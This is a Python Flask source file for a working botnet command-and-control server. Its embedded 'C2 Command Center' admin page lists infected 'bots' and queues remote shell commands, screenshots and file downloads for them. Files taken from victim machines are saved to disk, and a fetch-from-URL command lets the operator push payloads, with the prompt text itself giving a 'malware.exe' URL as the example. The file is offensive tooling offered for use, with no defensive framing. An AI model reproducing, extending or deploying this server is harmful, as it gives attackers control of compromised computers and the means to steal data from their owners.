from flask import Flask, request, jsonify, send_file, render_template_string, Response
import time
import os
import json
import base64
from datetime import datetime
from io import BytesIO

app = Flask(__name__)

# --- GLOBAL STATE (In-Memory) ---
# Clients: { client_id: { "ip": str, "last_seen": float, "hostname": str } }
CLIENTS = {}
# Command Queue: { client_id: [ { "type": str, "args": str, "id": str } ] }
COMMANDS = {}
# Results: { client_id: [ { "type": str, "content": str, "timestamp": str } ] }
RESULTS = {}

UPLOAD_FOLDER = 'server_uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# --- ADMIN UI TEMPLATE ---
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Admin Panel</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; margin: 0; padding: 20px; }
        .container { max_width: 1200px; margin: 0 auto; }
        .panel { border: 1px solid #333; padding: 10px; margin-bottom: 20px; background: #222; }
        h2 { border-bottom: 1px solid #444; padding-bottom: 5px; margin-top: 0; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
        th { background: #333; }
        tr:hover { background: #2a2a2a; }
        input, select, button { background: #333; color: white; border: 1px solid #555; padding: 5px; }
        button:hover { background: #444; cursor: pointer; }
        .status-online { color: #0f0; }
        .status-offline { color: #f00; }
        #log-window { height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; background: #000; white-space: pre-wrap; }
        .img-preview { max_width: 100%; border: 1px solid #555; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ C2 COMMAND CENTER ]</h1>
        
        <div class="panel">
            <h2>Connected Bots</h2>
            <button onclick="refreshBots()">Refresh List</button>
            <table id="bots-table">
                <thead><tr><th>ID</th><th>IP</th><th>Hostname</th><th>Last Seen</th><th>Actions</th></tr></thead>
                <tbody></tbody>
            </table>
        </div>

        <div class="panel">
            <h2>Control Panel</h2>
            <div>
                <label>Target Bot ID:</label>
                <input type="text" id="target-id" placeholder="Select a bot above" readonly>
            </div>
            <br>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="cmd-input" placeholder="Command (e.g., dir, whoami)" style="flex-grow: 1;">
                <button onclick="sendCommand('shell')">Shell Exec</button>
                <button onclick="sendCommand('screenshot')">Screenshot</button>
                <button onclick="sendCommand('download')">Download File</button>
                <button onclick="uploadFile()">Upload File to Bot</button>
            </div>
        </div>

        <div class="panel">
            <h2>Live Feed / Logs</h2>
            <div id="log-window"></div>
        </div>
    </div>

    <script>
        let currentBot = null;
        const API_BASE = "";

        function selectBot(id) {
            currentBot = id;
            document.getElementById('target-id').value = id;
            log(`Selected Bot: ${id}`);
            fetchResults(id);
        }

        async function refreshBots() {
            const res = await fetch(API_BASE + '/api/clients');
            const data = await res.json();
            const tbody = document.querySelector('#bots-table tbody');
            tbody.innerHTML = '';
            
            for (const [id, info] of Object.entries(data)) {
                const now = Date.now() / 1000;
                const lastSeen = info.last_seen;
                const isOnline = (now - lastSeen) < 10; // 10s threshold
                
                const row = `
                    <tr onclick="selectBot('${id}')" style="cursor:pointer">
                        <td>${id}</td>
                        <td>${info.ip}</td>
                        <td>${info.hostname}</td>
                        <td class="${isOnline ? 'status-online' : 'status-offline'}">
                            ${isOnline ? 'ONLINE' : 'OFFLINE'} (${Math.floor(now - lastSeen)}s ago)
                        </td>
                        <td><button onclick="selectBot('${id}')">Select</button></td>
                    </tr>
                `;
                tbody.innerHTML += row;
            }
        }

        async function sendCommand(type) {
            if (!currentBot) { alert("Select a bot first!"); return; }
            let args = "";
            
            if (type === 'shell' || type === 'download') {
                args = document.getElementById('cmd-input').value;
                if (!args) { alert("Enter an argument/command!"); return; }
            }

            const res = await fetch(API_BASE + '/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ id: currentBot, type: type, args: args })
            });
            const j = await res.json();
            log(`Command Sent: ${type} ${args} -> ${j.status}`);
            
            // Start polling for results
            setTimeout(() => fetchResults(currentBot), 2000);
        }

        async function uploadFile() {
             if (!currentBot) { alert("Select a bot first!"); return; }
             const url = prompt("Enter Direct Download URL for the bot to fetch (e.g. http://site.com/malware.exe):");
             if (url) {
                 document.getElementById('cmd-input').value = url;
                 sendCommand('upload_url');
             }
        }
        
        async function fetchResults(botId) {
            if (botId !== currentBot) return;
            const res = await fetch(API_BASE + `/api/results/${botId}`);
            const data = await res.json();
            
            const logWin = document.getElementById('log-window');
            logWin.innerHTML = ""; // Clear for now, can append if preferred
            
            data.forEach(item => {
                let content = item.content;
                if (item.type === 'screenshot') {
                     content = `<img src="data:image/jpeg;base64,${content}" class="img-preview">`;
                } else if (item.type === 'file_download') {
                     content = `[FILE DOWNLOADED] Saved to server as: ${item.filename}`;
                }
                
                logWin.innerHTML += `<div><strong>[${item.timestamp}] ${item.type}:</strong><br>${content}</div><hr>`;
            });
        }

        function log(msg) {
            const logWin = document.getElementById('log-window');
            logWin.innerHTML += `<div>[SYSTEM] ${msg}</div>`;
            logWin.scrollTop = logWin.scrollHeight;
        }

        setInterval(refreshBots, 5000);
        refreshBots();
    </script>
</body>
</html>
"""

# --- BOT ENDPOINTS ---

@app.route('/')
def index():
    return "Service Running"

@app.route('/register', methods=['POST'])
def register():
    """Bot check-in/registration"""
    data = request.json
    client_id = data.get('id')
    hostname = data.get('hostname')
    
    CLIENTS[client_id] = {
        "ip": request.remote_addr,
        "hostname": hostname,
        "last_seen": time.time()
    }
    
    if client_id not in COMMANDS:
        COMMANDS[client_id] = []
        
    print(f"[+] Bot Check-in: {client_id} ({request.remote_addr})")
    return jsonify({"status": "ok"})

@app.route('/poll/<client_id>', methods=['GET'])
def poll(client_id):
    """Bot long-polling for commands"""
    if client_id in CLIENTS:
        CLIENTS[client_id]['last_seen'] = time.time()
    
    # Check for pending commands
    if client_id in COMMANDS and len(COMMANDS[client_id]) > 0:
        cmd = COMMANDS[client_id].pop(0)
        return jsonify(cmd)
    
    return jsonify({"status": "idle"})

@app.route('/report/<client_id>', methods=['POST'])
def report(client_id):
    """Bot reporting results"""
    data = request.json
    if client_id not in RESULTS:
        RESULTS[client_id] = []
        
    result_entry = {
        "type": data.get('type'),
        "content": data.get('content'),
        "filename": data.get('filename'),
        "timestamp": datetime.now().strftime("%H:%M:%S")
    }
    
    # If it's a file download, save it to disk
    if data.get('type') == 'file_download' and data.get('content'):
        try:
            file_data = base64.b64decode(data.get('content'))
            fname = f"{client_id}_{data.get('filename')}"
            path = os.path.join(UPLOAD_FOLDER, fname)
            with open(path, 'wb') as f:
                f.write(file_data)
            result_entry['content'] = f"Saved to {fname}" 
            print(f"[+] File received from {client_id}: {fname}")
        except Exception as e:
            result_entry['content'] = f"Error saving file: {e}"

    RESULTS[client_id].insert(0, result_entry) # Prepend newest
    RESULTS[client_id] = RESULTS[client_id][:20] # Keep last 20
    
    print(f"[*] Result received from {client_id}: {data.get('type')}")
    return jsonify({"status": "received"})

# --- ADMIN ENDPOINTS ---

@app.route('/admin')
def admin_ui():
    return render_template_string(ADMIN_HTML)

@app.route('/api/clients')
def api_clients():
    return jsonify(CLIENTS)

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.json
    client_id = data.get('id')
    cmd_type = data.get('type')
    args = data.get('args', '')
    
    if client_id not in COMMANDS:
        COMMANDS[client_id] = []
        
    COMMANDS[client_id].append({
        "type": cmd_type,
        "args": args,
        "id": str(time.time())
    })
    
    return jsonify({"status": "queued"})

@app.route('/api/results/<client_id>')
def api_results(client_id):
    return jsonify(RESULTS.get(client_id, []))

if __name__ == '__main__':
    # Run on all interfaces
    app.run(host='0.0.0.0', port=5000)
